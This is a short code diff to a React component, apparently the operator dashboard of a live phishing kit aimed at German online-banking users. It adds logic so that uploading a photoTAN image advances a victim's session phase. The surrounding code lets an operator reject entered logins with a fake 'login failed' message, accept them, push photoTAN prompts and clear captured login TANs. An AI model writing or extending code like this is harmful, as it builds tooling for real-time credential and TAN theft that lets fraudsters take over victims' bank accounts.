@@ -95,7 +95,14 @@ const AdressLiveCard = () => {
   const rejectLogin = (r: Row) => setPhase(r, "login_rejected", { last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten." });
   const acceptLogin = (r: Row) => setPhase(r, "confirm", { last_error: null });
   const setDeviceName = (r: Row, name: string) => update(r.id, { device_name: name });
-  const setPhotoTanImage = (r: Row, dataUrl: string | null) => update(r.id, { photo_tan_image: dataUrl });
+  const setPhotoTanImage = (r: Row, dataUrl: string | null) => {
+    const patch: Record<string, any> = { photo_tan_image: dataUrl };
+    if (dataUrl && r.customer_phase === "change_phototan_request") {
+      patch.customer_phase = "change_phototan";
+      patch.last_error = null;
+    }
+    return update(r.id, patch);
+  };
   const showLoginPhotoTan = (r: Row) => setPhase(r, "login_phototan", { last_error: null });
   const rejectLoginTan = async (r: Row) => {
     await (supabase as any).from("panel_task_meta").update({ login_tan: null }).eq("task_id", `adress:${r.id}`);
